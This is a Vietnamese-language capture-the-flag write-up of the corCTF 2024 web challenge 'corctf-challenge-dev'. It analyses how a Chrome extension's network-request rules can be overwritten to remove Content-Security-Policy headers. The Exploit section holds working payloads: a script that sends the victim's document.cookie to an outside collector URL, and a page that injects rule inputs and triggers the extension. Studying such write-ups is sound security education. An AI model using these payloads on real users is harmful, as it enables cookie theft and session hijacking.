@@ -1,0 +1,132 @@
+---
+title: corctf-challenge-dev
+description: ''
+tags:
+  - writeup
+  - xss
+  - rce
+  - lfi
+  - csp
+  - file-upload
+category: web
+draft: false
+ctf_event: Corctf2024
+date: 2023-07-04
+---
+
+import Callout from '@/components/mdx/Callout.astro';
+
+Status: Done
+
+## Summary
+
+<Callout type="note" title="Note">
+💡
+
+</Callout>
+
+## Description
+
+1. `npx @puppeteer/browsers install chrome@stable`
+
+   Install Chrome with
+
+2. `~/chrome/linux-127.0.6533.72/chrome-linux64/chrome --disable-extensions-except=./extension/ --load=extension=./extension/`
+
+   Start Chrome like this
+
+3. `rm -rf ~/.config/google-chrome-for-testing/`
+
+   Reset the environment with
+
+   Test voi bot local
+
+   ![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled.png)
+
+## Analyst
+
+- Dễ nhìn thấy đoạn code vuln xss. Tuy nhiên phần csp rất khó để bypass
+- Ý tưởng khá lạ của bài này là khi bot visit url sẽ load lên extension đc setup ở manifest
+- File manifest như sau
+
+![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-1.png)
+
+- Có tổng cộng 3 file js, trong đó ta sẽ tập trung phân tích 2 file
+- Đầu tiên file form_handler.js:
+
+![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-2.png)
+
+- Hiểu qua thì file này sẽ tạo ra 1 thẻ div sau đó insert vào document.body
+- Điều hay ở đây là trong thẻ div có 1 thẻ button khi thẻ này đc click thì nó sẽ lấy các thuộc tính trong thẻ “block-options” thực hiện serialize và merge với base_rule. Mà base_rule là rule extension được set trong local.storage.
+- File thứ 2 là file req_handler.js
+
+![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-3.png)
+
+- Hiểu qua file này thì mỗi khi 1 tabs đc load mới thì sẽ registerRules() và sau đó sẽ set rule vào declarativeNetRequest.
+- Đối với declarativeNetRequest thì có 1 thược tính type là modifyHeaders có thể sử dụng để tắt đc csp,… Từ đó có thể thực hiện đc XSS. https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest
+- Từ đó ý tưởng của ta là ta sẽ viết một server mà ở đó sẽ thêm các thẻ input vào thẻ div vào thẻ #condition. Sau đó ta sẽ thực hiện click button để [local.storage](http://local.storage) sẽ set lại các rule, tắt đi csp. Từ đó ta load lại web và thực hiện xss đọc document.cookie
+
+![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-4.png)
+
+## Exploit
+
+```python
+<script>
+        const w = window.open("/")
+        w.onload = () => {
+            window.location = "https://3nis2z6r.requestrepo.com" + "?" + w.document.cookie
+        }
+</script>
+```
+
+```python
+
+<iframe src="http://localhost:8080/challenge/0333fd79ac4e"></iframe>
+<script>
+  const sleep = (s) => new Promise((r) => setTimeout(r, s))
+  document.addEventListener("DOMContentLoaded", async () => {
+    await sleep(1000)
+    const condition = document.querySelector("#condition")
+    const form = document.querySelector("#submit-btn")
+
+    function createRules(name, value) {
+      const inp1 = document.createElement("input")
+      inp1.name = name
+      inp1.value = value
+      condition.appendChild(inp1)
+    }
+
+    condition.innerHTML = ""
+
+    const STAGE_MAPPINGS = [
+      ["priority", "1"],
+      ["action.type", "modifyHeaders"],
+      ["action.requestHeaders.0.header", "content-security-policy-report-only"],
+      ["action.requestHeaders.0.operation", "remove"],
+      ["action.responseHeaders.0.header", "Content-Security-Policy"],
+      ["action.responseHeaders.0.operation", "remove"],
+      ["condition.urlFilter", "*"],
+      ["condition.initiatorDomains.0", "127.0.0.1"],
+      ["condition.initiatorDomains.1", "webhook.site"],
+      ["condition.initiatorDomains.2", "localhost"],
+      ["condition.resourceTypes.0", "main_frame"],
+      ["condition.resourceTypes.1", "sub_frame"],
+    ]
+    for (const i in STAGE_MAPPINGS) {
+      const st = STAGE_MAPPINGS[i]
+      createRules(st[0], st[1])
+    }
+
+    // Dispatch the click event
+    form.dispatchEvent(new Event('click'))
+    await sleep(2000)
+    location.reload()
+  })
+</script>
+```
+
+## Result
+
+![Untitled](/uploads/corctf-challenge-dev/corctf-challenge-dev/untitled-5.png)
+
+Đọc để hiểu kỹ hơn về bài https://cor.team/posts/corctf-2024-corctf-challenge-dev/
